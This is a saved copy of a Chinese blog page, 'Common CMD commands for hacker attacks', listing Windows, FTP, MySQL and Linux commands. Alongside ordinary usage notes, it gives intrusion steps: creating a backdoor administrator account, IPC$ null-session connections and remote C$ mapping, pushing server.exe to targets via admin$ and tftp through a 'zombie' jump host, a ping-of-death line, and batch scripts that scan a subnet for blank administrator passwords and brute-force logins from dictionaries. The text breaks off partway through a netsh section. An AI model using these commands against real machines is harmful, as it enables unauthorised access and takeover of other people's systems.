@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<!-- saved from url=(0051)https://www.cnblogs.com/gsliuruigang/p/6481423.html -->
+<html lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="origin">
+    <meta name="description" content="黑客常用命令大全net user heibai lovechina /add 加一个heibai的用户密码为lovechina net localgroup Administrators heibai">
+    <meta property="og:description" content="黑客常用命令大全net user heibai lovechina /add 加一个heibai的用户密码为lovechina net localgroup Administrators heibai">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>黑客攻击常用CMD命令大全 - gscsd - 博客园</title>
+    <link id="favicon" rel="shortcut icon" href="https://common.cnblogs.com/favicon.svg" type="image/svg+xml">
+    
+    <link rel="stylesheet" href="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/blog-common.min.css">
+    <link id="MainCss" rel="stylesheet" href="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/bundle-webload.min.css">
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/bundle-webload-mobile.min.css">
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/gsliuruigang/rss">
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/gsliuruigang/rsd.xml">
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/gsliuruigang/wlwmanifest.xml">
+    <script src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/osd.js.下载"></script><script async="" src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/analytics.js.下载"></script><script>
+        var currentBlogId = 266202;
+        var currentBlogApp = 'gsliuruigang';
+        var cb_enable_mathjax = false;
+        var isLogined = false;
+        var isBlogOwner = false;
+        var skinName = 'WebLoad';
+        var visitorUserId = '';
+    </script>
+        <script>
+            var currentPostDateAdded = '2017-02-28 10:39';
+        </script>
+    <script src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/jquery-2.2.0.min.js.下载"></script>
+    <script src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/blog-common.min.js.下载"></script>
+    
+    
+    
+<script src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/pubads_impl_2020102001.js.下载" async=""></script><link rel="preload" href="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/f.txt" as="script"><script type="text/javascript" src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/f.txt"></script><link rel="prefetch" href="https://b93c10055399fc9c0dea66e0a1d305cf.safeframe.googlesyndication.com/safeframe/1-0-37/html/container.html"><link rel="prefetch" href="https://tpc.googlesyndication.com/safeframe/1-0-37/html/container.html"></head>
+<body class="has-navbar">
+    <a name="top"></a> 
+    <div id="top_nav" class="navbar">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园"><img src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/logo.svg" alt="博客园Logo"></a>
+                </li>
+                <li><a href="https://www.cnblogs.com/" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;skin-navbar-sitehome&#39;)">首页</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;skin-navbar-news&#39;)">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;skin-navbar-q&#39;)">博问</a></li>
+                <li><a id="nav_brandzone" href="https://brands.cnblogs.com/" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;skin-navbar-brands&#39;)">专区</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;skin-navbar-ing&#39;)">闪存</a></li>
+                <li><a href="https://edu.cnblogs.com/" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;skin-navbar-edu&#39;)">班级</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search" action="https://zzk.cnblogs.com/s" method="get">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="text" tabindex="3">
+                        <button type="submit" id="zzk_search_button">
+                            <img src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/search.svg" alt="搜索">
+                        </button>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客" style="display: none;">
+                        <img id="myblog_icon" class="navbar-icon" src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/myblog.svg" alt="我的博客">
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息" style="display: none;">
+                        <img id="msg_icon" class="navbar-icon" src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/message.svg" alt="短消息">
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown" style="display: none;">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="./黑客攻击常用CMD命令大全 - gscsd - 博客园_files/avatar-default.svg" alt="用户头像">
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="javascript:void(0)" onclick="logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup/" style="display: inline;">注册</a>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signin/?returnUrl=https://www.cnblogs.com/" style="display: inline;">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    
+    <div id="home">
+    <div id="header">
+        <div id="blogTitle">
+            
+<div class="title"><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/gsliuruigang/">gscsd</a>
+</div>
+<div class="subtitle">
+
+</div>
+
+        </div>
+        <div id="navigator">
+            
+<ul id="navList">
+    <li id="nav_sitehome"><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+    <li id="nav_myhome">
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/gsliuruigang/">
+首页</a>
+</li>
+    <li id="nav_newpost">
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+    <li id="nav_contact">
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/gscsd">
+联系</a></li>
+    <li id="nav_rss">
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/gsliuruigang/rss/">
+订阅</a></li>
+    <li id="nav_admin">
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+            <div class="blogStats">
+                
+<span id="stats_post_count">随笔 - 
+22&nbsp;</span>
+<span id="stats_article_count">文章 - 
+0&nbsp;</span>
+<!-- <span id="stats-comment_count"></span> -->
+<span id="stats_comment_count">评论 - 
+1</span>
+            </div>
+        </div>
+    </div>
+    <div id="main">
+        <div id="mainContent">
+            <div class="forFlow">
+                <div id="post_detail">
+    <div id="topics">
+        <div class="post">
+            <h1 class="postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/gsliuruigang/p/6481423.html">
+    <span>黑客攻击常用CMD命令大全</span>
+    
+
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                
+<div id="cnblogs_post_body" class="blogpost-body">
+    <div class="article">
+<div id="note-353067706" class="note-container" data-url="https://www.douban.com/note/353067706/" data-author="MOJAY" data-is-original="0">
+<div id="note_353067706_full">
+<div id="link-report" class="note">黑客常用命令大全<br>net user heibai lovechina /add        加一个heibai的用户密码为lovechina <br>net localgroup Administrators heibai /add     把他加入Administrator组<br>net start telnet                     开对方的TELNET服务<br>net use z:\127.0.0.1c$          映射对方的C盘<br>net use \\ip\ipc$ " " /user:" " 建立IPC空链接 <br>net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接 <br>net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: <br>net use h: \\ip\c$ 登陆后映射对方C：到本地为H: <br>net use \\ip\ipc$ /del 删除IPC链接 <br>net use h: /del 删除映射对方到本地的为H:的映射 <br>net user 用户名　密码　/add         建立用户 <br>net user             查看有哪些用户 <br>net user 帐户名    查看帐户的属性<br><br>net user guest /active:yes      将Guest用户激活<br>net user guest lovechina        把guest的密码改为lovechina<br>net user 用户名 /delete           删掉用户<br>net user guest/time:m-f,08:00-17:00 表示guest用户登录时间为周一至周 五的net user guest/time:m,4am-5pm;t,1pm-3pm;w-f,8:00-17:00 表示guest用户登录时间为周一4:00/17:00,周二13:00/15:00,周三至周五8:00/17:00.<br><br>net user guest/time:all表示没有时间限制.<br><br>net user guest/time 表示guest用户永远不能登录. 但是只能限制登陆时间，不是上网时间<br><br>net time \\127.0.0.1              得到对方的时间， <br>get c:\index.htm d:\             上传的文件是INDEX.HTM，它位于C:\下，传到对方D:\ <br>copy index.htm \\127.0.0.1\c$\index.htm     本地C盘下的index.htm复制到127.0.0.1的C盘<br>net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数 <br>net start 查看开启了哪些服务 <br>net start 服务名　 开启服务；(如:net start telnet， net start schedule) <br>net stop 服务名 停止某服务 <br>net time \\目标ip 查看对方时间 <br>net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加参数/yes可取消确认信息 net view    查看本地局域网内开启了哪些共享 <br>net view \\ip 查看对方局域网内开启了哪些共享 <br>net config 显示系统网络设置 <br>net logoff 断开连接的共享 <br>net pause 服务名 暂停某服务 <br>net send ip "文本信息" 向对方发信息 <br>net ver 局域网内正在使用的网络连接类型和信息 <br>net share 查看本地开启的共享 <br>net share ipc$ 开启ipc$共享 <br>net share ipc$ /del 删除ipc$共享 <br>net share c$ /del 删除C：共享 <br>net user guest 12345 用guest用户登陆后用将密码改为12345 <br>net password 密码 更改系统登陆密码 <br>netstat -a 查看开启了哪些端口,常用netstat -an <br>netstat -n 查看端口的网络连接情况，常用netstat -an <br>netstat -v 查看正在进行的工作 <br>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） <br>netstat -s 查看正在使用的所有协议使用情况 <br>nbtsta* -* ** 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 <br>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 <br>ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 <br>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) <br>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 <br>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) <br>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) <br>del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件<br><br>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） <br>move 盘符\路径\要移动的文件名　存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 <br>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"&gt; "和"&gt; &gt;" 是重定向命令 <br>at id号 开启已注册的某个计划任务 <br>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 <br>at id号 /delete 停止某个已注册的计划任务 <br>at 查看所有的计划任务 <br>at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 <br>finger username @host 查看最近有哪些用户登陆 <br>telnet ip 端口 远和登陆服务器,默认端口为23 <br>open ip 连接到IP（属telnet登陆后的命令） <br>telnet 在本机上直接键入telnet 将进入本机的telnet <br>copy 路径\文件名1　路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 <br>copy c:\srv.exe $"&gt;\\ip\admin$ 复制本地c:\srv.exe到对方的admin下 <br>cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 <br>copy $\svv.exe"&gt;\\ip\admin$\svv.exe c:\ 或:copy\\ip\admin$\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： <br>xcopy 要复制的文件或目录树　目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 <br>tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 <br>tftp -i 对方IP　put c:\server.exe 登陆后，上传本地c:\server.exe至主机 <br>ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) <br>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface <br>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 <br>start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 <br>mem 查看cpu使用情况 <br>attrib 文件名(目录名) 查看某文件（目录）的属性 <br>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 <br>dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 <br>date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 <br>set 指定环境变量名称=要指派给变量的字符 设置环境变量 <br>set 显示当前所有的环境变量 <br>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 <br>pause 暂停批处理程序，并显示出：请按任意键继续.... <br>if 在批处理程序中执行条件处理（更多说明见if命令及变量） <br>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） <br>call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） <br>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） <br>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 <br>echo 信息 在屏幕上显示出信息 <br>echo 信息 &gt;&gt; pass.txt 将"信息"保存到pass.txt文件中 <br>findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello <br>find 文件名 查找某文件 <br>title 标题名字 更改CMD窗口标题名字 <br>color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 <br>prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ ) <br>print 文件名 打印文本文件<br><br>ver 在DOS窗口下显示版本信息 <br>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） <br>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS <br>md　目录名 创建目录 <br>replace 源文件　要替换文件的目录 替换文件 <br>ren 原文件名　新文件名 重命名文件名 <br>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 <br>type 文件名 显示文本文件的内容 <br>more 文件名 逐屏显示输出文件 <br>doskey 要锁定的命令＝字符 <br>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= <br>taskmgr 调出任务管理器 <br>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 <br>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 <br>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe <br>path 路径\可执行文件的文件名 为可执行文件设置一个路径。 <br>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?<br>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； <br>regedit /e 注册表文件名 导出注册表 <br>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 <br>cacls 文件名 查看文件的访问用户权限列表 <br>REM 文本内容 在批处理文件中添加注解 <br>netsh 查看或更改本地网络配置情况<br><br>IIS服务命令： <br>iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） <br>iisreset /start或stop 启动（停止）所有Internet服务 <br>iisreset /restart 停止然后重新启动所有Internet服务 <br>iisreset /status 显示所有Internet服务状态 <br>iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 <br>iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 <br>iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 <br>iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 <br>FTP 命令： (后面有详细说明内容) <br>ftp的命令行格式为: <br>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 <br>－d 使用调试方式。 <br>－n 限制ftp的自动登录,即不使用.netrc文件。 <br>－g 取消全局文件名。 <br>help [命令] 或 ？[命令] 查看命令说明 <br>bye 或 quit 终止主机FTP进程,并退出FTP管理方式. <br>pwd 列出当前远端主机目录 <br>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 <br>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 <br>mget [remote-files] 从远端主机接收一批文件至本地主机 <br>mput local-files 将本地主机中一批文件传送至远端主机 <br>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 <br>ascii 设定以ASCII方式传送文件(缺省值) <br>bin 或 image 设定以二进制方式传送文件 <br>bell 每完成一次文件传送,报警提示 <br>cdup 返回上一级目录 <br>close 中断与远程服务器的ftp会话(与open对应) <br>open host[port] 建立指定ftp服务器连接,可指定连接端口 <br>delete 删除远端主机中的文件 <br>mdelete [remote-files] 删除一批文件 <br>mkdir directory-name 在远端主机中建立目录 <br>rename [from] [to] 改变远端主机中的文件名 <br>rmdir directory-name 删除远端主机中的目录 <br>status 显示当前FTP的状态 <br>system 显示远端主机系统类型 <br>user user-name [password] [account] 重新以别的用户名登录远端主机 <br>open host [port] 重新建立一个新的连接 <br>prompt 交互提示模式 <br>macdef 定义宏命令 <br>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 <br>chmod 改变远端主机的文件权限 <br>case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 <br>cd remote－dir 进入远程主机目录 <br>cdup 进入远程主机目录的父目录 <br>! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip<br><br>MYSQL 命令： <br>mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 <br>（例：mysql -h110.110.110.110 -Uroot -P123456 <br>注:u与root可以不用加空格，其它也一样） <br>exit 退出MYSQL <br>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码 <br>grant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） <br>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 <br>use mysql； <br>show tables; 显示库中的数据表 <br>describe 表名; 显示数据表的结构 <br>create database 库名; 建库 <br>use 库名； <br>create table 表名 (字段设定列表)； 建表 <br>drop database 库名; <br>drop table 表名； 删库和删表 <br>delete from 表名; 将表中记录清空 <br>select * from 表名; 显示表中的记录 <br>mysqldump --opt school&gt;school.bbb 备份数据库：（命令在DOS的\\mysql\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 <br>win2003系统下新增命令（实用部份）： <br>shutdown /参数 关闭或重启本地或远程主机。 <br>参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 <br>例：shutdown /r /t 0 立即重启本地主机（无延时） <br>taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 <br>参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 <br>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 <br>参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。<br><br>Linux系统下基本命令： 要区分大小写 <br>uname 显示版本信息（同win2K的 ver） <br>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） <br>pwd 查询当前所在的目录位置 <br>cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。 <br>cat 文件名 查看文件内容 <br>cat &gt;abc.txt 往abc.txt文件中写上内容。 <br>more 文件名 以一页一页的方式显示一个文本文件。 <br>cp 复制文件 <br>mv 移动文件 <br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录 <br>mkdir 目录名 建立目录 <br>rmdir 删除子目录，目录内没有文档。 <br>chmod 设定档案或目录的存取权限 <br>grep 在档案中查找字符串 <br>diff 档案文件比较 <br>find 档案搜寻 <br>date 现在的日期、时间 <br>who 查询目前和你使用同一台机器的人以及Login时间地点 <br>w 查询目前上机者的详细资料 <br>whoami 查看自己的帐号名称 <br>groups 查看某人的Group <br>passwd 更改密码 <br>history 查看自己下过的命令 <br>ps 显示进程状态 <br>kill 停止某进程 <br>gcc 黑客通常用它来编译C语言写的文件 <br>su 权限转换为指定使用者 <br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 <br>ftp ftp连接上某服务器（同win2K）<br><br>附：批处理命令与变量<br><br>1：for命令及变量 基本格式： <br>FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 <br>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use $"&gt;\\ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3<br><br>(set):指定一个或一组文件，可使用通配符，如：(D:\user.txt)和(1 1 254)(1 -1 254),{“(1 1 254)”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1}<br><br>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开 <br>command_parameters：为特定命令指定参数或命令行开关<br><br>IN (set)：指在(set)中取值；DO command ：指执行command<br><br>参数：/L 指用增量形式{(set)为增量形式时}；/F 指从文件中不断取值，直到取完为止{(set)为文件时，如(d:\pass.txt)时}。 <br>用法举例： <br>@echo off <br>echo 用法格式：test.bat *.*.* &gt; test.txt<br><br>for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \\%1.%%G /user:administrator | find "命令成功完成" &gt;&gt;test.txt <br>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。<br><br>/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 <br>@echo off <br>echo 用法格式：ok.bat ip <br>FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200 <br>存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Net命令的另类用法<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Net User命令是一个DOS命令，必须在Windows XP下的MS-DOS模式下运行，所以首先要进入MS-DOS模式：选择“开始”菜单的“附件”选项的子选项“命令提示符”，或在“开始”菜单的“运行”选项（快捷键为Win+R）中输入“cmd.exe”，进入MS-DOS模式。以下功能都基于此模式下。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;建立一个普通新用户在MS-DOS提示符中输入如下命令：“net user john 123 /add”，回车。即可新建一个名为“John”，密码为“123”的新用户。Add参数表示新建用户。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;值得注意的是：用户名最多可有 20 个字符，密码最多可有 127 个字符。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;建立一个登录时间受限制的用户用以下方法可实现对电脑使用时间的控制。比如，需要建立一个John的用户账号，密码为“123”，登录权限从星期一到星期五的早上八点到晚上十点和双休日的晚上七点到晚上九点。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1. 12小时制可键入如下命令：“net user john 123 /add /times：monday-friday，8AM-10PM；saturday-sunday，7PM-9PM”，回车确定即可。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2. 24小时制可键入如下命令：“net user john 123 /add /times：M-F，8：00-22：00；Sa-Su，19：00-21：00”，回车确定即可。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;值得注意的是：Time的增加值限制为1小时。对于Day值，可以用全称或缩写（即 M、T、W、Th、F、Sa、Su）。可以使用12小时或24小时时间表示法。对于12小时表示法，请使用AM、PM或A.M.、P.M.。All值表示用户始终可以登录；空值（空白）意味着用户永远不能登录。用逗号分隔日期和时间，用分号分隔日期和时间单元（例如，M，4AM-5PM；T，1PM-3PM）。指定时间时不要使用空格。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外，Passwordchg：{yesno}参数可用来指定用户是否可以更改自己的密码，默认设置为 Yes.限定用户的使用时间Net User命令还可以使用参数Expires：{{mm/dd/yyyy dd/mm/yyyy mmm，dd ，yyyy} never} 使用户账号根据指定的Date过期限定用户。过期日期可以是 [mm/dd/yyyy]、[dd/mm/yyyy] 或[mmm，dd，yyyy]格式。它取决于国家（地区）代码。用户账号在指定日期开始时到期。对于月份值，可以使用数字、全称或三个字母的缩写（即Jan、Feb、Mar、Apr、May、Jun、Jul、Aug、Sep、Oct、Nov、Dec）。对于年份值，可以使用两位数或四位数；使用逗号和斜杠分隔日期的各部分；不要使用空格。<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Netsh的使用(组图)<br><br>　　有朋友问我，“能不能在命令行下直接修改Windows2000的IP地址？”。<br>　　<br>　　当然是可以的了。不仅可以修改IP地址，和网络相关的每个细节都可以用命令行方式进行配置。<br>　　<br>　　只不过一般大家不太习惯罢了。<br>　　<br>　　方法就是使用系统中提供的一个命令行工具“netsh”：<br>　　<br>　　首先，察看自己现在的ip地址：<br>　　　<br><br><br>　　列出了两块网卡，其中接口名为“本地连接”的这块网卡配置情况：<br>　　<br>　　